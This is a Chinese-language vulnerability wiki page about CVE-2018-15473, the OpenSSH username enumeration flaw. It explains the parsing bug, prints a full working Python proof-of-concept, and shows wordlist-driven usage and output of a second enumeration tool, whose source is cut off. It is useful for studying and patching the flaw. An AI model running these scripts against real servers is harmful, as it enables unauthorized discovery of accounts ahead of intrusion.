<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenSSH/%EF%BC%88CVE-2018-15473%EF%BC%89OpenSSH%20%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2018-15473）OpenSSH 用户枚举漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2018-15473\uff09OpenSSH \u7528\u6237\u679a\u4e3e\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "Examples", url: "#examples" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2020-15778%EF%BC%89OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2020-15778%EF%BC%89OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-15778）OpenSSH 命令注入漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../OpenSSH-ProxyCommand%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-%28CVE-2023-51385%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../OpenSSH-ProxyCommand%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-%28CVE-2023-51385%29/" class="btn btn-xs btn-link">
        OpenSSH ProxyCommand命令注入漏洞 (CVE 2023 51385)
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2018-15473openssh">（CVE-2018-15473）OpenSSH 用户枚举漏洞<a class="headerlink" href="#cve-2018-15473openssh" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>OpenSSH（OpenBSD安全外壳）是OpenBSD计划组的一套用于安全访问远程计算机的连接工具。该工具是SSH协议的开源实现，支持对所有的传输进行加密，可有效阻止窃听，连接劫持以及其他网络级OpenSSH
7.7及之前版本中存在信息中断。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可以利用入侵获取组件敏感信息。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>OpenSSH \&lt; 7.7</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>这个漏洞存在于OpenSSH所实现的一些认证功能之中，首先我们一起看一看Ubuntu
OpenSSH的公共密钥认证漏洞。</p>
<p>通过向一台OpenSSH服务器发送恶意的公共密钥认证消息，攻击者将能够获取特定的用户名信息。如果用户不存在，服务器将会向客户端发送认证失败的消息。如果用户存在，消息将无法解析并终止通信，即通信连接会在没有任何消息回传的情况下断开。关于该漏洞的漏洞利用代码可以从这个Python
PoC脚本中获取：</p>
<blockquote>
<p>pip2 install --upgrade paramiko==2.4.1</p>
<p>pip2 install paramiko</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>

<span class="c1"># Copyright (c) 2018 Matthew Daley</span>
<span class="c1">#</span>
<span class="c1"># Permission is hereby granted, free of charge, to any person obtaining a copy</span>
<span class="c1"># of this software and associated documentation files (the &quot;Software&quot;), to</span>
<span class="c1"># deal in the Software without restriction, including without limitation the</span>
<span class="c1"># rights to use, copy, modify, merge, publish, distribute, sublicense, and/or</span>
<span class="c1"># sell copies of the Software, and to permit persons to whom the Software is</span>
<span class="c1"># furnished to do so, subject to the following conditions:</span>
<span class="c1">#</span>
<span class="c1"># The above copyright notice and this permission notice shall be included in</span>
<span class="c1"># all copies or substantial portions of the Software.</span>
<span class="c1">#</span>
<span class="c1"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span>
<span class="c1"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span>
<span class="c1"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span>
<span class="c1"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span>
<span class="c1"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING</span>
<span class="c1"># FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS</span>
<span class="c1"># IN THE SOFTWARE.</span>


<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">paramiko</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>


<span class="k">class</span><span class="w"> </span><span class="nc">InvalidUsername</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
    <span class="k">pass</span>


<span class="k">def</span><span class="w"> </span><span class="nf">add_boolean</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="k">pass</span>


<span class="n">old_service_accept</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">auth_handler</span><span class="o">.</span><span class="n">AuthHandler</span><span class="o">.</span><span class="n">_handler_table</span><span class="p">[</span>
        <span class="n">paramiko</span><span class="o">.</span><span class="n">common</span><span class="o">.</span><span class="n">MSG_SERVICE_ACCEPT</span><span class="p">]</span>

<span class="k">def</span><span class="w"> </span><span class="nf">service_accept</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="n">paramiko</span><span class="o">.</span><span class="n">message</span><span class="o">.</span><span class="n">Message</span><span class="o">.</span><span class="n">add_boolean</span> <span class="o">=</span> <span class="n">add_boolean</span>
    <span class="k">return</span> <span class="n">old_service_accept</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">userauth_failure</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="k">raise</span> <span class="n">InvalidUsername</span><span class="p">()</span>


<span class="n">paramiko</span><span class="o">.</span><span class="n">auth_handler</span><span class="o">.</span><span class="n">AuthHandler</span><span class="o">.</span><span class="n">_handler_table</span><span class="o">.</span><span class="n">update</span><span class="p">({</span>
    <span class="n">paramiko</span><span class="o">.</span><span class="n">common</span><span class="o">.</span><span class="n">MSG_SERVICE_ACCEPT</span><span class="p">:</span> <span class="n">service_accept</span><span class="p">,</span>
    <span class="n">paramiko</span><span class="o">.</span><span class="n">common</span><span class="o">.</span><span class="n">MSG_USERAUTH_FAILURE</span><span class="p">:</span> <span class="n">userauth_failure</span>
<span class="p">})</span>

<span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s1">&#39;paramiko.transport&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">addHandler</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">NullHandler</span><span class="p">())</span>

<span class="n">arg_parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
<span class="n">arg_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;hostname&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
<span class="n">arg_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--port&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">22</span><span class="p">)</span>
<span class="n">arg_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">arg_parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">args</span><span class="o">.</span><span class="n">hostname</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">))</span>
<span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s1">&#39;[-] Failed to connect&#39;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">transport</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">transport</span><span class="o">.</span><span class="n">Transport</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">transport</span><span class="o">.</span><span class="n">start_client</span><span class="p">()</span>
<span class="k">except</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">ssh_exception</span><span class="o">.</span><span class="n">SSHException</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s1">&#39;[-] Failed to negotiate SSH transport&#39;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">transport</span><span class="o">.</span><span class="n">auth_publickey</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">RSAKey</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">2048</span><span class="p">))</span>
<span class="k">except</span> <span class="n">InvalidUsername</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s1">&#39;[*] Invalid username&#39;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="k">except</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">ssh_exception</span><span class="o">.</span><span class="n">AuthenticationException</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s1">&#39;[+] Valid username&#39;</span>
</code></pre></div>

<p>这个漏洞之所以存在，是因为服务器在对消息完整解析之前，用户查询了不存在的用户名。想要修复该漏洞也很简单，按攻击逻辑反着来就行了：首先对消息进行完整解析，然后再建立通信连接。</p>
<p>测试漏洞利用PoC的一种方法就是在调试模式下开启OpenSSH服务器：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId24.png" /></p>
<p>然后用已存在的有效用户名运行PoC脚本：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
<p>在服务器端将会查看到错误提示：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
<p>相关错误信息还可以在/var/log/auth.log中找到：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
<p>如果无法正确解析消息，会导致客户端跟服务器端之间的通信中断，而且中断时不会收到服务器发送的提示信息：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
<p>注意粉红色标记的最后一个数据包（客户端数据包），这里没有后续的蓝色数据包（服务器数据包）。</p>
<p>当PoC脚本以不存在的用户名运行之后：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId29.png" /></p>
<p>不会弹出"imcomplete message"错误提示：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId31.png" /></p>
<p>注意通信数据结尾处的蓝色服务器数据包。</p>
<p>这就是该漏洞（公共密钥认证漏洞）暴露有效用户名的整个流程了。</p>
<p>其中，userauth_pubkey函数是认证功能所实现的其中一个函数，专门用于根据公共密钥来完成身份验证。如果认证失败，则返回"0"，成功则返回"1"。当服务器端接收到了SSH2_MSG_USERAUTH_REQUEST请求后，便会调用该函数，之后的结果会用来给客户端回传SSH2_MSG_USERAUTH_FAILURE或SSH2_MSG_USERAUTH_SUCCESS消息。</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId32.png" /></p>
<p>该函数的运行逻辑为：</p>
<blockquote>
<p>\1. 如果用户名不存在：返回"0"；</p>
<p>\2. 如果用户名存在但密钥错误：返回"0"；</p>
<p>\3. 如果用户名存在且密钥正确：返回"1"；</p>
</blockquote>
<p>但是有人发现，我们竟然可以在第一步和第二步中间终止userauth_pubkey函数的运行。第一步执行完后，userauth_pubkey函数会从客户端获取消息字符串，如果获取失败（恶意字符串导致），整个过程都会终止，并在不发送任何回传消息的情况下关闭连接。</p>
<p>packet_get_string所导致的情况如下：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId33.png" /></p>
<p>如果用户名存在，第一步会在程序从消息域中提取完数据后进行。</p>
<p>第一个提取的数据域是一个布尔值（1字节），对应函数为packet_get_char()。如果认证类型为publickey，返回值就是"1"。后续跟着的是两个字符串：算法和密钥。在SSH消息中，字符串会以一个"长度-值"键值对进行编码，一个字符串为4个字节。</p>
<p>函数packet_get_string可以从消息中提取字符串，并对其进行验证，这个函数还需要依赖另一个函数：ssh_ssh_packet_get_string。</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId34.png" /></p>
<p>ssh_packet_get_string函数会调用sshpkt_get_string函数，如果返回的值不是"0"，它还会调用fatal函数。函数fatal会记录致命的错误事件，然后终止生成的OpenSSH进程（不回传任何错误信息）。</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId35.png" /></p>
<p>接下来会执行sshpkt_get_string函数并调用sshbuf_get_string函数：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId36.png" /></p>
<p>然后sshbuf_get_string函数会调用sshbuf_get_string_direct：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId37.png" /></p>
<p>然后sshbuf_get_string_direct会调用sshbuf_peek_string_direct:</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId38.png" /></p>
<p>最后，sshbuf_peek_string_direct会进行字符串验证：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId39.png" /></p>
<p>如果消息中剩余数据小于4字节，或者说消息中的剩余数据小于字符串长度，则会返回SSH_ERR_MESSAGE_INCOMPLETE
错误消息。这就是我们之前那个Python
PoC脚本所要触发的东西。首先，它会跟OpenSSH服务器建立一条加密的通信链接，然后向其发送恶意的SSH2_MSG_USERAUTH_REQUEST消息。通过重定义add_boolean函数，消息中的布尔值域会被忽略。</p>
<p>当函数userauth_pubkey解析了恶意消息之后，首先会读取布尔值域，由于这个域其实是不存在的，因此读取的会是下一个域（函数packet_get_char）：加密算法字符串的4字节长度值。然后调用下一个函数packet_get_string来读取加密算法字符串。</p>
<p>下面是解析合法消息的过程：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId40.png" /></p>
<p>下面是解析恶意消息的过程：</p>
<p><img alt="" src="../resource/%28CVE-2018-15473%29OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId41.png" /></p>
<p>结果就是，代码解析了一个1907字节的字符串（十六进制为0×00000773），这比整个消息的长度还要长，这会导致ssh_packet_get_string调用fatal函数，并中断OpenSSH进程。</p>
<h3 id="poc">poc补充<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<blockquote>
<p>不知道为什么上面那个poc运行就报错了。这里找了一个能用的poc</p>
</blockquote>
<h2 id="examples">Examples<a class="headerlink" href="#examples" title="Permanent link">&para;</a></h2>
<blockquote>
<p>A single username</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="p">(</span><span class="n">cve</span><span class="o">-</span><span class="mi">2018</span><span class="o">-</span><span class="mi">15473</span><span class="p">)</span><span class="err">─</span><span class="o">&gt;</span><span class="w"> </span><span class="o">./</span><span class="n">ssh</span><span class="o">-</span><span class="n">username</span><span class="o">-</span><span class="k">enum</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">epi</span><span class="w"> </span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">epi</span><span class="w"> </span><span class="n">found</span><span class="o">!</span>
</code></pre></div>

<blockquote>
<p>Use a wordlist with 10 threads (the default is 4)</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="p">(</span><span class="n">cve</span><span class="o">-</span><span class="mi">2018</span><span class="o">-</span><span class="mi">15473</span><span class="p">)</span><span class="err">─</span><span class="o">&gt;</span><span class="w"> </span><span class="o">./</span><span class="n">ssh</span><span class="o">-</span><span class="n">username</span><span class="o">-</span><span class="k">enum</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">unix_users</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">avahi</span><span class="w"> </span><span class="n">found</span><span class="o">!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">avahi</span><span class="o">-</span><span class="n">autoipd</span><span class="w"> </span><span class="n">found</span><span class="o">!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">backup</span><span class="w"> </span><span class="n">found</span><span class="o">!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">daemon</span><span class="w"> </span><span class="n">found</span><span class="o">!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">bin</span><span class="w"> </span><span class="n">found</span><span class="o">!</span>
<span class="o">------</span><span class="mi">8</span><span class="o">&lt;------</span>
</code></pre></div>

<blockquote>
<p>IPv6 Address on port 2222 and INCREASED VERBOSITY!</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="c">(cve</span><span class="nb">-</span><span class="c">2018</span><span class="nb">-</span><span class="c">15473)─</span><span class="nv">&gt;</span><span class="c"> </span><span class="nt">.</span><span class="c">/ssh</span><span class="nb">-</span><span class="c">username</span><span class="nb">-</span><span class="c">enum</span><span class="nt">.</span><span class="c">py </span><span class="nb">-</span><span class="c">6 </span><span class="nb">-</span><span class="c">p 2222 </span><span class="nb">-</span><span class="c">v </span><span class="nb">-</span><span class="c">w /usr/share/metasploit</span><span class="nb">-</span><span class="c">framework/data/wordlists/unix_users</span><span class="nt">.</span><span class="c">txt &#39;::1&#39;</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> 4Dgifts not found</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> demo not found</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> checkfs not found</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> anon not found</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> EZsetup not found</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> auditor not found</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> demos not found</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> OutOfBox not found</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> checkfsys not found</span>
<span class="k">[</span><span class="nb">+</span><span class="k">]</span><span class="c"> avahi found!</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> diag not found</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> ROOT not found</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> checksys not found</span>
<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> cmwlogin not found</span>
<span class="k">[</span><span class="nb">+</span><span class="k">]</span><span class="c"> avahi</span><span class="nb">-</span><span class="c">autoipd found!</span>
<span class="nb">------</span><span class="c">8</span><span class="nv">&lt;</span><span class="nb">------</span>
</code></pre></div>

<blockquote>
<p><strong>requirements.txt</strong></p>
<p>asn1crypto==0.24.0&gt; bcrypt==3.1.4&gt; cffi==1.11.5&gt; cryptography==2.3.1&gt; idna==2.7&gt; paramiko==2.4.1&gt; pyasn1==0.4.4&gt; pycparser==2.18&gt; PyNaCl==1.2.1&gt; six==1.11.0</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">derived from work done by Matthew Daley</span>
<span class="sd">https://bugfuzz.com/stuff/ssh-check-username.py</span>
<span class="sd">props to Justin Gardner for the add_boolean workaround</span>
<span class="sd">CVE-2018-15473</span>
<span class="sd">--------------</span>
<span class="sd">OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an</span>
<span class="sd">invalid authenticating user until after the packet containing the request has been fully parsed, related to</span>
<span class="sd">auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.</span>
<span class="sd">Author: epi</span>
<span class="sd">    https://epi052.gitlab.io/notes-to-self/</span>
<span class="sd">    https://gitlab.com/epi052/cve-2018-15473</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">multiprocessing</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">Union</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pathlib</span><span class="w"> </span><span class="kn">import</span> <span class="n">Path</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">paramiko</span>

<span class="k">assert</span> <span class="n">sys</span><span class="o">.</span><span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">6</span><span class="p">),</span> <span class="s2">&quot;This program requires python3.6 or higher&quot;</span>


<span class="k">class</span><span class="w"> </span><span class="nc">Color</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot; Class for coloring print statements.  Nothing to see here, move along. &quot;&quot;&quot;</span>
    <span class="n">BOLD</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1m&#39;</span>
    <span class="n">ENDC</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[0m&#39;</span>
    <span class="n">RED</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[38;5;196m&#39;</span>
    <span class="n">BLUE</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[38;5;75m&#39;</span>
    <span class="n">GREEN</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[38;5;149m&#39;</span>
    <span class="n">YELLOW</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[38;5;190m&#39;</span>

    <span class="nd">@staticmethod</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">string</span><span class="p">(</span><span class="n">string</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">color</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">bold</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot; Prints the given string in a few different colors.</span>
<span class="sd">        Args:</span>
<span class="sd">            string: string to be printed</span>
<span class="sd">            color:  valid colors &quot;red&quot;, &quot;blue&quot;, &quot;green&quot;, &quot;yellow&quot;</span>
<span class="sd">            bold:   T/F to add ANSI bold code</span>
<span class="sd">        Returns:</span>
<span class="sd">            ANSI color-coded string (str)</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="n">boldstr</span> <span class="o">=</span> <span class="n">Color</span><span class="o">.</span><span class="n">BOLD</span> <span class="k">if</span> <span class="n">bold</span> <span class="k">else</span> <span class="s2">&quot;&quot;</span>
        <span class="n">colorstr</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">Color</span><span class="p">,</span> <span class="n">color</span><span class="o">.</span><span class="n">upper</span><span class="p">())</span>
